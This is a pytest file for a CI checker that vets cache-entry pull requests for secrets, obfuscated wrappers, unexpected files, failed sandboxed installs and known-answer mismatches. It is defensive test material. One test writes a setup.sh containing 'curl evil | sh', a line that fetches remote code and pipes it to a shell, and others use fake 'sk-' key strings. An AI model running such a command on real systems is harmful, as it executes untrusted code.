"""scripts/check_cache_entry.py: what CI runs on cache PRs. The sandboxed
install is mocked; running the script on the real cache/ entries is how it
was verified end to end."""

from __future__ import annotations

import importlib.util
import json
from pathlib import Path
from unittest.mock import patch

import pytest

from legwork.retry_loop import AttemptLog, RunResult

_spec = importlib.util.spec_from_file_location(
    "check_cache_entry", Path(__file__).parent.parent / "scripts" / "check_cache_entry.py"
)
checker = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(checker)

FIXTURE = Path(__file__).parent / "fixtures" / "ai_data_extractor_payload.py"
MANIFEST = {
    "source_repo_url": "https://github.com/owner/repo",
    "commit_sha": "a" * 40,
    "install_command": "pip install repo",
    "entrypoint": "Does a thing",
    "llm_model": "gpt-test",
    "source_license": "MIT",
    "license_flag": None,
    "known_answer": {
        "tool": "count",
        "arguments": {"path": "{fixtures}/three-lines.txt"},
        "expect_contains": ["3"],
        "derived_from": "the fixture has three lines",
    },
}
OK = RunResult(True, "", "pip install repo", [AttemptLog(1, "cached wrapper", "success", "")], attempt_dir=Path("x"))


def entry(tmp_path, name="owner__repo", manifest=None, wrapper="print('hi')\n", extra=None):
    d = tmp_path / name
    d.mkdir()
    (d / "manifest.json").write_text(json.dumps(manifest or MANIFEST))
    (d / "wrapper.py").write_text(wrapper)
    (d / "fixtures").mkdir()
    (d / "fixtures" / "three-lines.txt").write_text("a\nb\nc\n")
    for fname, text in (extra or {}).items():
        (d / fname).write_text(text)
    return d


@pytest.fixture(autouse=True)
def sandbox_ok():
    with (
        patch.object(checker.retry_loop, "run_cached", return_value=OK) as run_cached,
        patch.object(checker.cache_writer, "check_verbatim_copy"),
        patch.object(checker.repo_fetcher, "remote_head_sha", return_value="a" * 40),
        patch.object(checker, "run_known_answer", return_value=[]),
    ):
        yield run_cached


def test_a_good_entry_passes_and_shows_its_install_command(tmp_path):
    problems, summary = checker.check(entry(tmp_path))
    assert problems == []
    assert any("`pip install repo`" in line and "review it" in line for line in summary)


def test_folder_must_match_the_source_repo(tmp_path):
    problems, _ = checker.check(entry(tmp_path, name="someone__else"))
    assert any("should be named owner__repo" in p for p in problems)


def test_secrets_fail_the_entry(tmp_path):
    problems, _ = checker.check(entry(tmp_path, wrapper="KEY = 'sk-abcdefghijklmnopqrstuvwxyz123'\n"))
    assert any("sk- style API key" in p for p in problems)


def test_obfuscated_wrapper_fails_before_anything_installs(tmp_path, sandbox_ok):
    problems, _ = checker.check(entry(tmp_path, wrapper=FIXTURE.read_text()))
    assert any("obfuscated" in p for p in problems)
    sandbox_ok.assert_not_called()


def test_extra_files_fail_the_entry(tmp_path):
    problems, _ = checker.check(entry(tmp_path, extra={"setup.sh": "curl evil | sh"}))
    assert any("unexpected files: setup.sh" in p for p in problems)


def test_a_failing_self_test_fails_the_entry(tmp_path, sandbox_ok):
    sandbox_ok.return_value = RunResult(False, None, None, [], final_error="DependencyInstallError: nope")
    problems, _ = checker.check(entry(tmp_path))
    assert any("failed its sandboxed install/self-test" in p for p in problems)


def test_main_exits_nonzero_if_any_entry_fails(tmp_path):
    good = entry(tmp_path)
    bad = entry(tmp_path, name="x__y", manifest={**MANIFEST, "source_repo_url": "https://github.com/x/y"}, wrapper="KEY='sk-abcdefghijklmnopqrstuvwxyz123'")
    assert checker.main([str(good)]) == 0
    assert checker.main([str(good), str(bad)]) == 1


# --- known answers (issue #3) ------------------------------------------------


def test_an_entry_without_a_known_answer_fails(tmp_path):
    manifest = {k: v for k, v in MANIFEST.items() if k != "known_answer"}
    problems, _ = checker.check(entry(tmp_path, manifest=manifest))
    assert any("no known_answer" in p for p in problems)


@pytest.mark.parametrize(
    ("change", "complaint"),
    [
        ({"tool": ""}, "known_answer.tool"),
        ({"expect_contains": ["ok", ""]}, "expect_contains"),
        ({"expect_contains": [], "expect_image": None}, "something to compare"),
        ({"derived_from": " "}, "derived_from"),
        ({"expect_image": {"width": "640"}}, "expect_image"),
    ],
)
def test_a_malformed_known_answer_is_refused_before_installing(tmp_path, sandbox_ok, change, complaint):
    manifest = dict(MANIFEST, known_answer={**MANIFEST["known_answer"], **change})
    problems, _ = checker.check(entry(tmp_path, manifest=manifest))
    assert any(complaint in p for p in problems)
    sandbox_ok.assert_not_called()


def test_fixtures_must_be_small_plain_files(tmp_path):
    d = entry(tmp_path)
    (d / "fixtures" / "big.bin").write_bytes(b"x" * (checker.MAX_FIXTURE_BYTES + 1))
    (d / "fixtures" / "link").symlink_to(tmp_path)
    problems, _ = checker.check(d)
    assert any("under 2 MB" in p for p in problems) and any("links" in p for p in problems)


def test_the_known_answer_runs_after_the_self_test_and_its_failure_fails_the_entry(tmp_path):
    with patch.object(checker, "run_known_answer", return_value=["known answer: expected '3' in the reply"]) as run:
        problems, _ = checker.check(entry(tmp_path))
    assert problems == ["known answer: expected '3' in the reply"] and run.called


def test_internet_known_answers_are_skipped_unless_asked_for(tmp_path):
    manifest = dict(MANIFEST, needs_network=True)
    with patch.object(checker, "run_known_answer", return_value=[]) as run:
        problems, summary = checker.check(entry(tmp_path, manifest=manifest))
        assert problems == [] and not run.called and any("skipped" in s for s in summary)
        checker.check(entry(tmp_path, name="other__repo", manifest=dict(manifest, source_repo_url="https://github.com/other/repo")), network=True)
        assert run.called


def _png(width, height):
    import base64
    import struct
    import zlib

    ihdr = struct.pack(">IIBBBBB", width, height, 8, 6, 0, 0, 0)
    chunk = struct.pack(">I", len(ihdr)) + b"IHDR" + ihdr + struct.pack(">I", zlib.crc32(b"IHDR" + ihdr))
    return base64.b64encode(b"\x89PNG\r\n\x1a\n" + chunk).decode()


def test_comparing_a_reply_with_the_known_answer():
    answer = {"tool": "t", "expect_contains": ["Offline sync conflicts"], "expect_image": {"width": 4, "height": 2}}
    good = {"content": [{"type": "text", "text": "row: Offline sync conflicts"}, {"type": "image", "data": _png(4, 2)}]}
    assert checker.compare_known_answer(answer, good) == []
    wrong_size = {"content": [good["content"][0], {"type": "image", "data": _png(5, 2)}]}
    assert any("4x2" in p for p in checker.compare_known_answer(answer, wrong_size))
    missing = {"content": [{"type": "text", "text": "something else"}]}
    problems = checker.compare_known_answer(answer, missing)
    assert any("Offline sync conflicts" in p for p in problems) and any("expected an image" in p for p in problems)
    error = {"content": [{"type": "text", "text": "boom"}], "isError": True}
    assert "returned an error" in checker.compare_known_answer(answer, error)[0]


def test_fixture_paths_are_filled_in_everywhere():
    args = {"path": "{fixtures}/a.pdf", "paths": ["{fixtures}/b.png"], "n": 3}
    assert checker._with_fixtures(args, Path("/f")) == {"path": "/f/a.pdf", "paths": ["/f/b.png"], "n": 3}
